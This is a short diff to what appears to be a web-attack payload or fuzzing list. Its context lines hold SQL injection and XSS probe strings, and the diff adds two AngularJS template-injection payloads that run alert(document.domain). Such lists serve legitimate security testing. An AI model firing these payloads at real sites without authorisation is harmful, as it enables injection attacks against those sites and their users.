@@ -7,3 +7,5 @@
 '%20OR%201=1--
 "><img src=xss>
 )+AND+SLEEP(5)%23
+{{constructor.constructor("alert(document.domain)")()}}
+{{constructor.constructor('alert(document.domain)')()}}
